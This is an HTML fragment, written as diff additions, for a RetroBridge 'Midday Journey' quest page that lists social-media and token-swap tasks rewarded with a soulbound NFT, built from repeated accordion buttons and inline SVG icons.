+								<div class="phase-page-hero">
+									<h1 class="phase-page-hero--heading">Midday Journey</h1>
+									<p class="phase-page-hero--content text-center">
+										Midday Journey will be dedicated to cross chain swap functionality of RetroBridge. As a reward for users commitment to Midday Journey they will receive Soulbound NFT, which is impossible to transfer
+										or sell.
+									</p>
+								</div>
+								<div class="row">
+									<div class="col-12 col-lg-6 order-2 order-lg-1">
+										<div class="phase-body-content">
+											<div class="phase-body-badge">15583 Unique Addresses Participant</div>
+											<h2 class="phase-body-heading">Complete quests to get RetroBridge Midday NFT</h2>
+											<span class="phase-body-text">and obtain second of four RetroBridge Phases NFTs</span>
+											<div class="phase-body-accordions" data-orientation="vertical">
+												<div data-state="closed" data-orientation="vertical" class="phase-page-accordion">
+													<button
+														type="button"
+														aria-controls="radix-:rc:"
+														aria-expanded="false"
+														data-state="closed"
+														data-orientation="vertical"
+														id="radix-:rb:"
+														class="phase-page-accordion--trigger"
+														data-radix-collection-item=""
+													>
+														<div class="phase-page-accordion--trigger-left-icon">
+															<svg xmlns="http://www.w3.org/2000/svg" width="42" height="42" viewBox="0 0 42 42" fill="none">
+																<rect width="42" height="42" rx="8" fill="white" fill-opacity="0.1"></rect>
+																<g clip-path="url(#clip0_3154_12773)">
+																	<path
+																		d="M23.3765 16.4415C24.6174 17.0905 25.5663 18.2212 25.9564 19.5937H25.2187C25.0457 19.5937 24.8868 19.689 24.8053 19.8414C24.7239 19.9938 24.733 20.1787 24.8287 20.3225C24.8838 20.4175 26.5759 23.3317 26.4694 23.1481C26.6433 23.4089 27.0754 23.4089 27.2494 23.1481C27.4281 22.8404 28.9827 20.2169 28.9214 20.3225C29.0171 20.1787 29.0261 19.9938 28.9447 19.8414C28.8633 19.689 28.7043 19.5937 28.5314 19.5937H27.8901C27.4625 17.4875 26.0848 15.739 24.2323 14.7769C24.2632 14.8944 24.2808 15.0159 24.2808 15.1406C24.2817 16.1436 23.4706 16.379 23.3765 16.4415Z"
+																		fill="white"
+																	></path>
+																	<path
+																		d="M20.3226 13.0786C20.1788 12.983 19.9939 12.9739 19.8415 13.0553C19.6891 13.1368 19.5939 13.2956 19.5939 13.4687V14.1098C17.0526 14.6258 15.0144 16.5144 14.2737 18.966C14.5242 18.7682 14.8215 18.6567 15.1407 18.6567C15.5609 18.6567 15.9432 18.8424 16.205 19.1477C16.7854 17.6512 18.0341 16.4869 19.5939 16.0436V16.7812C19.5939 16.9543 19.6891 17.1131 19.8415 17.1947C19.994 17.2761 20.1789 17.2669 20.3226 17.1714C20.4176 17.1162 23.3318 15.424 23.1482 15.5306C23.4092 15.3567 23.4092 14.9245 23.1482 14.7506C22.8406 14.572 20.217 13.0173 20.3226 13.0786Z"
+																		fill="white"
+																	></path>
+																	<path
+																		d="M13.0553 23.096C13.1368 23.2485 13.2956 23.3437 13.4687 23.3437H14.3773C14.9739 25.0285 16.2007 26.4024 17.7658 27.2183C17.7357 27.1024 17.7192 26.9824 17.7192 26.8593C17.7182 25.8607 18.5229 25.6241 18.6168 25.5619C17.6732 25.0677 16.8999 24.2927 16.4129 23.3437H16.7812C16.9543 23.3437 17.1131 23.2485 17.1947 23.096C17.2761 22.9437 17.2669 22.7588 17.1712 22.615C17.1162 22.52 15.424 19.6058 15.5306 19.7894C15.3567 19.5285 14.9245 19.5285 14.7506 19.7894C14.6271 20.0022 12.9776 22.789 13.0786 22.615C12.983 22.7588 12.9739 22.9437 13.0553 23.096Z"
+																		fill="white"
+																	></path>
+																	<path
+																		d="M22.4062 25.2187C22.4062 25.0457 22.311 24.8868 22.1585 24.8053C22.0062 24.7239 21.8213 24.733 21.6775 24.8287C21.5825 24.8838 18.6683 26.5759 18.8519 26.4694C18.591 26.6433 18.591 27.0754 18.8519 27.2494C19.1595 27.428 21.783 28.9827 21.6775 28.9214C21.8213 29.0171 22.0062 29.0261 22.1585 28.9447C22.311 28.8633 22.4062 28.7043 22.4062 28.5314V27.8901C24.5123 27.4625 26.2607 26.0851 27.2229 24.2327C27.1056 24.2637 26.9841 24.2812 26.8593 24.2812C26.0631 24.2812 25.7616 23.7739 25.5424 23.4091C24.8908 24.6343 23.7668 25.5697 22.4062 25.9564V25.2187Z"
+																		fill="white"
+																	></path>
+																</g>
+																<defs>
+																	<clipPath id="clip0_3154_12773"><rect width="16" height="16" fill="white" transform="translate(13 13)"></rect></clipPath>
+																</defs>
+															</svg>
+														</div>
+														<span class="phase-page-accordion--trigger-content loaded">
+															Follow <img src="retrobridge_icon.svg" alt="image0" /> RetroBridge on <img src="twitter_icon.png" alt="image1" /> Twitter
+														</span>
+														<div class="d-flex align-items-center gap-4 ms-auto">
+															<div class="phase-page-accordion--trigger-icon">
+																<svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 12 13" fill="none" class="is-closed">
+																	<path d="M6 3.28125V9.84375" stroke="white" stroke-linecap="round" stroke-linejoin="round"></path>
+																	<path d="M2.71875 6.5625H9.28125" stroke="white" stroke-linecap="round" stroke-linejoin="round"></path>
+																</svg>
+																<svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 12 13" fill="none" class="is-open">
+																	<path d="M2.5 6.5H9.5" stroke="#2F2038" stroke-linecap="round" stroke-linejoin="round"></path>
+																</svg>
+															</div>
+														</div>
+													</button>
+													<div
+														data-state="closed"
+														id="radix-:rc:"
+														hidden=""
+														role="region"
+														aria-labelledby="radix-:rb:"
+														data-orientation="vertical"
+														class="phase-page-accordion--content-wrapper"
+														style="--radix-accordion-content-height: var(--radix-collapsible-content-height); --radix-accordion-content-width: var(--radix-collapsible-content-width);"
+													></div>
+												</div>
+												<div data-state="closed" data-orientation="vertical" class="phase-page-accordion">
+													<button
+														type="button"
+														aria-controls="radix-:re:"
+														aria-expanded="false"
+														data-state="closed"
+														data-orientation="vertical"
+														id="radix-:rd:"
+														class="phase-page-accordion--trigger"
+														data-radix-collection-item=""
+													>
+														<div class="phase-page-accordion--trigger-left-icon">
+															<svg xmlns="http://www.w3.org/2000/svg" width="42" height="42" viewBox="0 0 42 42" fill="none">
+																<rect width="42" height="42" rx="8" fill="white" fill-opacity="0.1"></rect>
+																<g clip-path="url(#clip0_3154_12773)">
+																	<path
+																		d="M23.3765 16.4415C24.6174 17.0905 25.5663 18.2212 25.9564 19.5937H25.2187C25.0457 19.5937 24.8868 19.689 24.8053 19.8414C24.7239 19.9938 24.733 20.1787 24.8287 20.3225C24.8838 20.4175 26.5759 23.3317 26.4694 23.1481C26.6433 23.4089 27.0754 23.4089 27.2494 23.1481C27.4281 22.8404 28.9827 20.2169 28.9214 20.3225C29.0171 20.1787 29.0261 19.9938 28.9447 19.8414C28.8633 19.689 28.7043 19.5937 28.5314 19.5937H27.8901C27.4625 17.4875 26.0848 15.739 24.2323 14.7769C24.2632 14.8944 24.2808 15.0159 24.2808 15.1406C24.2817 16.1436 23.4706 16.379 23.3765 16.4415Z"
+																		fill="white"
+																	></path>
+																	<path
+																		d="M20.3226 13.0786C20.1788 12.983 19.9939 12.9739 19.8415 13.0553C19.6891 13.1368 19.5939 13.2956 19.5939 13.4687V14.1098C17.0526 14.6258 15.0144 16.5144 14.2737 18.966C14.5242 18.7682 14.8215 18.6567 15.1407 18.6567C15.5609 18.6567 15.9432 18.8424 16.205 19.1477C16.7854 17.6512 18.0341 16.4869 19.5939 16.0436V16.7812C19.5939 16.9543 19.6891 17.1131 19.8415 17.1947C19.994 17.2761 20.1789 17.2669 20.3226 17.1714C20.4176 17.1162 23.3318 15.424 23.1482 15.5306C23.4092 15.3567 23.4092 14.9245 23.1482 14.7506C22.8406 14.572 20.217 13.0173 20.3226 13.0786Z"
+																		fill="white"
+																	></path>
+																	<path
+																		d="M13.0553 23.096C13.1368 23.2485 13.2956 23.3437 13.4687 23.3437H14.3773C14.9739 25.0285 16.2007 26.4024 17.7658 27.2183C17.7357 27.1024 17.7192 26.9824 17.7192 26.8593C17.7182 25.8607 18.5229 25.6241 18.6168 25.5619C17.6732 25.0677 16.8999 24.2927 16.4129 23.3437H16.7812C16.9543 23.3437 17.1131 23.2485 17.1947 23.096C17.2761 22.9437 17.2669 22.7588 17.1712 22.615C17.1162 22.52 15.424 19.6058 15.5306 19.7894C15.3567 19.5285 14.9245 19.5285 14.7506 19.7894C14.6271 20.0022 12.9776 22.789 13.0786 22.615C12.983 22.7588 12.9739 22.9437 13.0553 23.096Z"
+																		fill="white"
+																	></path>
+																	<path
+																		d="M22.4062 25.2187C22.4062 25.0457 22.311 24.8868 22.1585 24.8053C22.0062 24.7239 21.8213 24.733 21.6775 24.8287C21.5825 24.8838 18.6683 26.5759 18.8519 26.4694C18.591 26.6433 18.591 27.0754 18.8519 27.2494C19.1595 27.428 21.783 28.9827 21.6775 28.9214C21.8213 29.0171 22.0062 29.0261 22.1585 28.9447C22.311 28.8633 22.4062 28.7043 22.4062 28.5314V27.8901C24.5123 27.4625 26.2607 26.0851 27.2229 24.2327C27.1056 24.2637 26.9841 24.2812 26.8593 24.2812C26.0631 24.2812 25.7616 23.7739 25.5424 23.4091C24.8908 24.6343 23.7668 25.5697 22.4062 25.9564V25.2187Z"
+																		fill="white"
+																	></path>
+																</g>
+																<defs>
+																	<clipPath id="clip0_3154_12773"><rect width="16" height="16" fill="white" transform="translate(13 13)"></rect></clipPath>
+																</defs>
+															</svg>
+														</div>
+														<span class="phase-page-accordion--trigger-content loaded">Retweet on <img src="twitter_icon.png" alt="image0" /> Twitter</span>
+														<div class="d-flex align-items-center gap-4 ms-auto">
+															<div class="phase-page-accordion--trigger-icon">
+																<svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 12 13" fill="none" class="is-closed">
+																	<path d="M6 3.28125V9.84375" stroke="white" stroke-linecap="round" stroke-linejoin="round"></path>
+																	<path d="M2.71875 6.5625H9.28125" stroke="white" stroke-linecap="round" stroke-linejoin="round"></path>
+																</svg>
+																<svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 12 13" fill="none" class="is-open">
+																	<path d="M2.5 6.5H9.5" stroke="#2F2038" stroke-linecap="round" stroke-linejoin="round"></path>
+																</svg>
+															</div>
+														</div>
+													</button>
+													<div
+														data-state="closed"
+														id="radix-:re:"
+														hidden=""
+														role="region"
+														aria-labelledby="radix-:rd:"
+														data-orientation="vertical"
+														class="phase-page-accordion--content-wrapper"
+														style="--radix-accordion-content-height: var(--radix-collapsible-content-height); --radix-accordion-content-width: var(--radix-collapsible-content-width);"
+													></div>
+												</div>
+												<div data-state="closed" data-orientation="vertical" class="phase-page-accordion">
+													<button
+														type="button"
+														aria-controls="radix-:rg:"
+														aria-expanded="false"
+														data-state="closed"
+														data-orientation="vertical"
+														id="radix-:rf:"
+														class="phase-page-accordion--trigger"
+														data-radix-collection-item=""
+													>
+														<div class="phase-page-accordion--trigger-left-icon">
+															<svg xmlns="http://www.w3.org/2000/svg" width="42" height="42" viewBox="0 0 42 42" fill="none">
+																<rect width="42" height="42" rx="8" fill="white" fill-opacity="0.1"></rect>
+																<g clip-path="url(#clip0_3154_12773)">
+																	<path
+																		d="M23.3765 16.4415C24.6174 17.0905 25.5663 18.2212 25.9564 19.5937H25.2187C25.0457 19.5937 24.8868 19.689 24.8053 19.8414C24.7239 19.9938 24.733 20.1787 24.8287 20.3225C24.8838 20.4175 26.5759 23.3317 26.4694 23.1481C26.6433 23.4089 27.0754 23.4089 27.2494 23.1481C27.4281 22.8404 28.9827 20.2169 28.9214 20.3225C29.0171 20.1787 29.0261 19.9938 28.9447 19.8414C28.8633 19.689 28.7043 19.5937 28.5314 19.5937H27.8901C27.4625 17.4875 26.0848 15.739 24.2323 14.7769C24.2632 14.8944 24.2808 15.0159 24.2808 15.1406C24.2817 16.1436 23.4706 16.379 23.3765 16.4415Z"
+																		fill="white"
+																	></path>
+																	<path
+																		d="M20.3226 13.0786C20.1788 12.983 19.9939 12.9739 19.8415 13.0553C19.6891 13.1368 19.5939 13.2956 19.5939 13.4687V14.1098C17.0526 14.6258 15.0144 16.5144 14.2737 18.966C14.5242 18.7682 14.8215 18.6567 15.1407 18.6567C15.5609 18.6567 15.9432 18.8424 16.205 19.1477C16.7854 17.6512 18.0341 16.4869 19.5939 16.0436V16.7812C19.5939 16.9543 19.6891 17.1131 19.8415 17.1947C19.994 17.2761 20.1789 17.2669 20.3226 17.1714C20.4176 17.1162 23.3318 15.424 23.1482 15.5306C23.4092 15.3567 23.4092 14.9245 23.1482 14.7506C22.8406 14.572 20.217 13.0173 20.3226 13.0786Z"
+																		fill="white"
+																	></path>
+																	<path
+																		d="M13.0553 23.096C13.1368 23.2485 13.2956 23.3437 13.4687 23.3437H14.3773C14.9739 25.0285 16.2007 26.4024 17.7658 27.2183C17.7357 27.1024 17.7192 26.9824 17.7192 26.8593C17.7182 25.8607 18.5229 25.6241 18.6168 25.5619C17.6732 25.0677 16.8999 24.2927 16.4129 23.3437H16.7812C16.9543 23.3437 17.1131 23.2485 17.1947 23.096C17.2761 22.9437 17.2669 22.7588 17.1712 22.615C17.1162 22.52 15.424 19.6058 15.5306 19.7894C15.3567 19.5285 14.9245 19.5285 14.7506 19.7894C14.6271 20.0022 12.9776 22.789 13.0786 22.615C12.983 22.7588 12.9739 22.9437 13.0553 23.096Z"
+																		fill="white"
+																	></path>
+																	<path
+																		d="M22.4062 25.2187C22.4062 25.0457 22.311 24.8868 22.1585 24.8053C22.0062 24.7239 21.8213 24.733 21.6775 24.8287C21.5825 24.8838 18.6683 26.5759 18.8519 26.4694C18.591 26.6433 18.591 27.0754 18.8519 27.2494C19.1595 27.428 21.783 28.9827 21.6775 28.9214C21.8213 29.0171 22.0062 29.0261 22.1585 28.9447C22.311 28.8633 22.4062 28.7043 22.4062 28.5314V27.8901C24.5123 27.4625 26.2607 26.0851 27.2229 24.2327C27.1056 24.2637 26.9841 24.2812 26.8593 24.2812C26.0631 24.2812 25.7616 23.7739 25.5424 23.4091C24.8908 24.6343 23.7668 25.5697 22.4062 25.9564V25.2187Z"
+																		fill="white"
+																	></path>
+																</g>
+																<defs>
+																	<clipPath id="clip0_3154_12773"><rect width="16" height="16" fill="white" transform="translate(13 13)"></rect></clipPath>
+																</defs>
+															</svg>
+														</div>
+														<span class="phase-page-accordion--trigger-content loaded">Swap <img src="ethereum.svg" alt="image0" /> ETH for any other asset</span>
+														<div class="d-flex align-items-center gap-4 ms-auto">
+															<div class="phase-page-accordion--trigger-icon">
+																<svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 12 13" fill="none" class="is-closed">
+																	<path d="M6 3.28125V9.84375" stroke="white" stroke-linecap="round" stroke-linejoin="round"></path>
+																	<path d="M2.71875 6.5625H9.28125" stroke="white" stroke-linecap="round" stroke-linejoin="round"></path>
+																</svg>
+																<svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 12 13" fill="none" class="is-open">
+																	<path d="M2.5 6.5H9.5" stroke="#2F2038" stroke-linecap="round" stroke-linejoin="round"></path>
+																</svg>
+															</div>
+														</div>
+													</button>
+													<div
+														data-state="closed"
+														id="radix-:rg:"
+														hidden=""
+														role="region"
+														aria-labelledby="radix-:rf:"
+														data-orientation="vertical"
+														class="phase-page-accordion--content-wrapper"
+														style="--radix-accordion-content-height: var(--radix-collapsible-content-height); --radix-accordion-content-width: var(--radix-collapsible-content-width);"
+													></div>
+												</div>
+												<div data-state="closed" data-orientation="vertical" class="phase-page-accordion">
+													<button
+														type="button"
+														aria-controls="radix-:ri:"
+														aria-expanded="false"
+														data-state="closed"
+														data-orientation="vertical"
+														id="radix-:rh:"
+														class="phase-page-accordion--trigger"
+														data-radix-collection-item=""
+													>
+														<div class="phase-page-accordion--trigger-left-icon">
+															<svg xmlns="http://www.w3.org/2000/svg" width="42" height="42" viewBox="0 0 42 42" fill="none">
+																<rect width="42" height="42" rx="8" fill="white" fill-opacity="0.1"></rect>
+																<g clip-path="url(#clip0_3154_12773)">
+																	<path
+																		d="M23.3765 16.4415C24.6174 17.0905 25.5663 18.2212 25.9564 19.5937H25.2187C25.0457 19.5937 24.8868 19.689 24.8053 19.8414C24.7239 19.9938 24.733 20.1787 24.8287 20.3225C24.8838 20.4175 26.5759 23.3317 26.4694 23.1481C26.6433 23.4089 27.0754 23.4089 27.2494 23.1481C27.4281 22.8404 28.9827 20.2169 28.9214 20.3225C29.0171 20.1787 29.0261 19.9938 28.9447 19.8414C28.8633 19.689 28.7043 19.5937 28.5314 19.5937H27.8901C27.4625 17.4875 26.0848 15.739 24.2323 14.7769C24.2632 14.8944 24.2808 15.0159 24.2808 15.1406C24.2817 16.1436 23.4706 16.379 23.3765 16.4415Z"
+																		fill="white"
+																	></path>
+																	<path
+																		d="M20.3226 13.0786C20.1788 12.983 19.9939 12.9739 19.8415 13.0553C19.6891 13.1368 19.5939 13.2956 19.5939 13.4687V14.1098C17.0526 14.6258 15.0144 16.5144 14.2737 18.966C14.5242 18.7682 14.8215 18.6567 15.1407 18.6567C15.5609 18.6567 15.9432 18.8424 16.205 19.1477C16.7854 17.6512 18.0341 16.4869 19.5939 16.0436V16.7812C19.5939 16.9543 19.6891 17.1131 19.8415 17.1947C19.994 17.2761 20.1789 17.2669 20.3226 17.1714C20.4176 17.1162 23.3318 15.424 23.1482 15.5306C23.4092 15.3567 23.4092 14.9245 23.1482 14.7506C22.8406 14.572 20.217 13.0173 20.3226 13.0786Z"
+																		fill="white"
+																	></path>
+																	<path
+																		d="M13.0553 23.096C13.1368 23.2485 13.2956 23.3437 13.4687 23.3437H14.3773C14.9739 25.0285 16.2007 26.4024 17.7658 27.2183C17.7357 27.1024 17.7192 26.9824 17.7192 26.8593C17.7182 25.8607 18.5229 25.6241 18.6168 25.5619C17.6732 25.0677 16.8999 24.2927 16.4129 23.3437H16.7812C16.9543 23.3437 17.1131 23.2485 17.1947 23.096C17.2761 22.9437 17.2669 22.7588 17.1712 22.615C17.1162 22.52 15.424 19.6058 15.5306 19.7894C15.3567 19.5285 14.9245 19.5285 14.7506 19.7894C14.6271 20.0022 12.9776 22.789 13.0786 22.615C12.983 22.7588 12.9739 22.9437 13.0553 23.096Z"
+																		fill="white"
+																	></path>
+																	<path
+																		d="M22.4062 25.2187C22.4062 25.0457 22.311 24.8868 22.1585 24.8053C22.0062 24.7239 21.8213 24.733 21.6775 24.8287C21.5825 24.8838 18.6683 26.5759 18.8519 26.4694C18.591 26.6433 18.591 27.0754 18.8519 27.2494C19.1595 27.428 21.783 28.9827 21.6775 28.9214C21.8213 29.0171 22.0062 29.0261 22.1585 28.9447C22.311 28.8633 22.4062 28.7043 22.4062 28.5314V27.8901C24.5123 27.4625 26.2607 26.0851 27.2229 24.2327C27.1056 24.2637 26.9841 24.2812 26.8593 24.2812C26.0631 24.2812 25.7616 23.7739 25.5424 23.4091C24.8908 24.6343 23.7668 25.5697 22.4062 25.9564V25.2187Z"
+																		fill="white"
+																	></path>
+																</g>
+																<defs>
+																	<clipPath id="clip0_3154_12773"><rect width="16" height="16" fill="white" transform="translate(13 13)"></rect></clipPath>
+																</defs>
+															</svg>
+														</div>
+														<span class="phase-page-accordion--trigger-content loaded">Swap <img src="usdt.svg" alt="image0" /> USDT for any other asset</span>
+														<div class="d-flex align-items-center gap-4 ms-auto">
+															<div class="phase-page-accordion--trigger-icon">
+																<svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 12 13" fill="none" class="is-closed">
+																	<path d="M6 3.28125V9.84375" stroke="white" stroke-linecap="round" stroke-linejoin="round"></path>
+																	<path d="M2.71875 6.5625H9.28125" stroke="white" stroke-linecap="round" stroke-linejoin="round"></path>
+																</svg>
+																<svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 12 13" fill="none" class="is-open">
+																	<path d="M2.5 6.5H9.5" stroke="#2F2038" stroke-linecap="round" stroke-linejoin="round"></path>
+																</svg>
+															</div>
+														</div>
+													</button>
+													<div
+														data-state="closed"
+														id="radix-:ri:"
+														hidden=""
+														role="region"
+														aria-labelledby="radix-:rh:"
+														data-orientation="vertical"
+														class="phase-page-accordion--content-wrapper"
+														style="--radix-accordion-content-height: var(--radix-collapsible-content-height); --radix-accordion-content-width: var(--radix-collapsible-content-width);"
+													></div>
+												</div>
+												<div data-state="closed" data-orientation="vertical" class="phase-page-accordion">
+													<button
+														type="button"
+														aria-controls="radix-:rk:"
+														aria-expanded="false"
+														data-state="closed"
+														data-orientation="vertical"
+														id="radix-:rj:"
+														class="phase-page-accordion--trigger"
+														data-radix-collection-item=""
+													>
+														<div class="phase-page-accordion--trigger-left-icon">
+															<svg xmlns="http://www.w3.org/2000/svg" width="42" height="42" viewBox="0 0 42 42" fill="none">
+																<rect width="42" height="42" rx="8" fill="white" fill-opacity="0.1"></rect>
+																<g clip-path="url(#clip0_3154_12773)">
+																	<path
+																		d="M23.3765 16.4415C24.6174 17.0905 25.5663 18.2212 25.9564 19.5937H25.2187C25.0457 19.5937 24.8868 19.689 24.8053 19.8414C24.7239 19.9938 24.733 20.1787 24.8287 20.3225C24.8838 20.4175 26.5759 23.3317 26.4694 23.1481C26.6433 23.4089 27.0754 23.4089 27.2494 23.1481C27.4281 22.8404 28.9827 20.2169 28.9214 20.3225C29.0171 20.1787 29.0261 19.9938 28.9447 19.8414C28.8633 19.689 28.7043 19.5937 28.5314 19.5937H27.8901C27.4625 17.4875 26.0848 15.739 24.2323 14.7769C24.2632 14.8944 24.2808 15.0159 24.2808 15.1406C24.2817 16.1436 23.4706 16.379 23.3765 16.4415Z"
+																		fill="white"
+																	></path>
+																	<path
+																		d="M20.3226 13.0786C20.1788 12.983 19.9939 12.9739 19.8415 13.0553C19.6891 13.1368 19.5939 13.2956 19.5939 13.4687V14.1098C17.0526 14.6258 15.0144 16.5144 14.2737 18.966C14.5242 18.7682 14.8215 18.6567 15.1407 18.6567C15.5609 18.6567 15.9432 18.8424 16.205 19.1477C16.7854 17.6512 18.0341 16.4869 19.5939 16.0436V16.7812C19.5939 16.9543 19.6891 17.1131 19.8415 17.1947C19.994 17.2761 20.1789 17.2669 20.3226 17.1714C20.4176 17.1162 23.3318 15.424 23.1482 15.5306C23.4092 15.3567 23.4092 14.9245 23.1482 14.7506C22.8406 14.572 20.217 13.0173 20.3226 13.0786Z"
+																		fill="white"
+																	></path>
+																	<path
+																		d="M13.0553 23.096C13.1368 23.2485 13.2956 23.3437 13.4687 23.3437H14.3773C14.9739 25.0285 16.2007 26.4024 17.7658 27.2183C17.7357 27.1024 17.7192 26.9824 17.7192 26.8593C17.7182 25.8607 18.5229 25.6241 18.6168 25.5619C17.6732 25.0677 16.8999 24.2927 16.4129 23.3437H16.7812C16.9543 23.3437 17.1131 23.2485 17.1947 23.096C17.2761 22.9437 17.2669 22.7588 17.1712 22.615C17.1162 22.52 15.424 19.6058 15.5306 19.7894C15.3567 19.5285 14.9245 19.5285 14.7506 19.7894C14.6271 20.0022 12.9776 22.789 13.0786 22.615C12.983 22.7588 12.9739 22.9437 13.0553 23.096Z"
+																		fill="white"
+																	></path>
+																	<path
+																		d="M22.4062 25.2187C22.4062 25.0457 22.311 24.8868 22.1585 24.8053C22.0062 24.7239 21.8213 24.733 21.6775 24.8287C21.5825 24.8838 18.6683 26.5759 18.8519 26.4694C18.591 26.6433 18.591 27.0754 18.8519 27.2494C19.1595 27.428 21.783 28.9827 21.6775 28.9214C21.8213 29.0171 22.0062 29.0261 22.1585 28.9447C22.311 28.8633 22.4062 28.7043 22.4062 28.5314V27.8901C24.5123 27.4625 26.2607 26.0851 27.2229 24.2327C27.1056 24.2637 26.9841 24.2812 26.8593 24.2812C26.0631 24.2812 25.7616 23.7739 25.5424 23.4091C24.8908 24.6343 23.7668 25.5697 22.4062 25.9564V25.2187Z"
+																		fill="white"
+																	></path>
+																</g>
+																<defs>
+																	<clipPath id="clip0_3154_12773"><rect width="16" height="16" fill="white" transform="translate(13 13)"></rect></clipPath>
+																</defs>
+															</svg>
+														</div>
+														<span class="phase-page-accordion--trigger-content loaded">Swap <img src="usdc.svg" alt="image0" /> USDC for any other asset</span>
+														<div class="d-flex align-items-center gap-4 ms-auto">
+															<div class="phase-page-accordion--trigger-icon">
+																<svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 12 13" fill="none" class="is-closed">
+																	<path d="M6 3.28125V9.84375" stroke="white" stroke-linecap="round" stroke-linejoin="round"></path>
+																	<path d="M2.71875 6.5625H9.28125" stroke="white" stroke-linecap="round" stroke-linejoin="round"></path>
+																</svg>
+																<svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 12 13" fill="none" class="is-open">
+																	<path d="M2.5 6.5H9.5" stroke="#2F2038" stroke-linecap="round" stroke-linejoin="round"></path>
+																</svg>
+															</div>
+														</div>
+													</button>
+													<div
+														data-state="closed"
+														id="radix-:rk:"
+														hidden=""
+														role="region"
+														aria-labelledby="radix-:rj:"
+														data-orientation="vertical"
+														class="phase-page-accordion--content-wrapper"
+														style="--radix-accordion-content-height: var(--radix-collapsible-content-height); --radix-accordion-content-width: var(--radix-collapsible-content-width);"
+													></div>
+												</div>
+												<div data-state="closed" data-orientation="vertical" class="phase-page-accordion">
+													<button
+														type="button"
+														aria-controls="radix-:rm:"
+														aria-expanded="false"
+														data-state="closed"
+														data-orientation="vertical"
+														id="radix-:rl:"
+														class="phase-page-accordion--trigger"
+														data-radix-collection-item=""
+													>
+														<div class="phase-page-accordion--trigger-left-icon">
+															<svg xmlns="http://www.w3.org/2000/svg" width="42" height="42" viewBox="0 0 42 42" fill="none">
+																<rect width="42" height="42" rx="8" fill="white" fill-opacity="0.1"></rect>
+																<g clip-path="url(#clip0_3154_12773)">
+																	<path
+																		d="M23.3765 16.4415C24.6174 17.0905 25.5663 18.2212 25.9564 19.5937H25.2187C25.0457 19.5937 24.8868 19.689 24.8053 19.8414C24.7239 19.9938 24.733 20.1787 24.8287 20.3225C24.8838 20.4175 26.5759 23.3317 26.4694 23.1481C26.6433 23.4089 27.0754 23.4089 27.2494 23.1481C27.4281 22.8404 28.9827 20.2169 28.9214 20.3225C29.0171 20.1787 29.0261 19.9938 28.9447 19.8414C28.8633 19.689 28.7043 19.5937 28.5314 19.5937H27.8901C27.4625 17.4875 26.0848 15.739 24.2323 14.7769C24.2632 14.8944 24.2808 15.0159 24.2808 15.1406C24.2817 16.1436 23.4706 16.379 23.3765 16.4415Z"
+																		fill="white"
+																	></path>
+																	<path
+																		d="M20.3226 13.0786C20.1788 12.983 19.9939 12.9739 19.8415 13.0553C19.6891 13.1368 19.5939 13.2956 19.5939 13.4687V14.1098C17.0526 14.6258 15.0144 16.5144 14.2737 18.966C14.5242 18.7682 14.8215 18.6567 15.1407 18.6567C15.5609 18.6567 15.9432 18.8424 16.205 19.1477C16.7854 17.6512 18.0341 16.4869 19.5939 16.0436V16.7812C19.5939 16.9543 19.6891 17.1131 19.8415 17.1947C19.994 17.2761 20.1789 17.2669 20.3226 17.1714C20.4176 17.1162 23.3318 15.424 23.1482 15.5306C23.4092 15.3567 23.4092 14.9245 23.1482 14.7506C22.8406 14.572 20.217 13.0173 20.3226 13.0786Z"
+																		fill="white"
+																	></path>
+																	<path
+																		d="M13.0553 23.096C13.1368 23.2485 13.2956 23.3437 13.4687 23.3437H14.3773C14.9739 25.0285 16.2007 26.4024 17.7658 27.2183C17.7357 27.1024 17.7192 26.9824 17.7192 26.8593C17.7182 25.8607 18.5229 25.6241 18.6168 25.5619C17.6732 25.0677 16.8999 24.2927 16.4129 23.3437H16.7812C16.9543 23.3437 17.1131 23.2485 17.1947 23.096C17.2761 22.9437 17.2669 22.7588 17.1712 22.615C17.1162 22.52 15.424 19.6058 15.5306 19.7894C15.3567 19.5285 14.9245 19.5285 14.7506 19.7894C14.6271 20.0022 12.9776 22.789 13.0786 22.615C12.983 22.7588 12.9739 22.9437 13.0553 23.096Z"
+																		fill="white"
+																	></path>
+																	<path
+																		d="M22.4062 25.2187C22.4062 25.0457 22.311 24.8868 22.1585 24.8053C22.0062 24.7239 21.8213 24.733 21.6775 24.8287C21.5825 24.8838 18.6683 26.5759 18.8519 26.4694C18.591 26.6433 18.591 27.0754 18.8519 27.2494C19.1595 27.428 21.783 28.9827 21.6775 28.9214C21.8213 29.0171 22.0062 29.0261 22.1585 28.9447C22.311 28.8633 22.4062 28.7043 22.4062 28.5314V27.8901C24.5123 27.4625 26.2607 26.0851 27.2229 24.2327C27.1056 24.2637 26.9841 24.2812 26.8593 24.2812C26.0631 24.2812 25.7616 23.7739 25.5424 23.4091C24.8908 24.6343 23.7668 25.5697 22.4062 25.9564V25.2187Z"
+																		fill="white"
+																	></path>
+																</g>
+																<defs>
+																	<clipPath id="clip0_3154_12773"><rect width="16" height="16" fill="white" transform="translate(13 13)"></rect></clipPath>
+																</defs>
+															</svg>
+														</div>
+														<span class="phase-page-accordion--trigger-content loaded">Join our RetroBridge <img src="discord_icon.svg" alt="image0" /> Discord</span>
+														<div class="d-flex align-items-center gap-4 ms-auto">
+															<div class="phase-page-accordion--trigger-icon">
+																<svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 12 13" fill="none" class="is-closed">
+																	<path d="M6 3.28125V9.84375" stroke="white" stroke-linecap="round" stroke-linejoin="round"></path>
+																	<path d="M2.71875 6.5625H9.28125" stroke="white" stroke-linecap="round" stroke-linejoin="round"></path>
+																</svg>
+																<svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 12 13" fill="none" class="is-open">
+																	<path d="M2.5 6.5H9.5" stroke="#2F2038" stroke-linecap="round" stroke-linejoin="round"></path>
+																</svg>
+															</div>
+														</div>
+													</button>
+													<div
+														data-state="closed"
+														id="radix-:rm:"
+														hidden=""
+														role="region"
